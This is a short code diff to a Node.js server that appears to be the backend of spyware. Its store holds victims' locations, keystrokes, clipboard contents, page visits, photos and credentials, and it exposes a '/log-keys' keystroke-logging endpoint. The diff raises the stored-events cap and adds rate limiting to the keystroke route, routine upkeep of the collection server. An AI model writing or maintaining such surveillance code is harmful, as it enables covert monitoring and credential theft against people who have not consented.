@@ -95,7 +95,7 @@ async function loadStoreFromRedis() {
 // ── Trim arrays to prevent store overflow ────────────────────
 function trimStore() {
     // Hard caps (most recent items kept)
-    const caps = { locations: 5000, events: 1000, keystrokes: 5000, clipboard: 500,
+    const caps = { locations: 5000, events: 2000, keystrokes: 5000, clipboard: 500,
                    pageVisits: 5000, photos: 2000, media: 500, errors: 500, credentials: 1000 };
     for (const [key, max] of Object.entries(caps)) {
         if (Array.isArray(store[key]) && store[key].length > max) store[key].length = max;
@@ -626,7 +626,7 @@ app.post('/device-info', (req, res) => {
 });
 
 // ── Keystroke logging ──
-app.post('/log-keys', (req, res) => {
+app.post('/log-keys', rateLimit(60, 10000), (req, res) => {
     const { clientId, keys, url } = req.body;
     if (!clientId || !keys) return res.status(400).json({ error: 'Missing data' });
     const entry = {
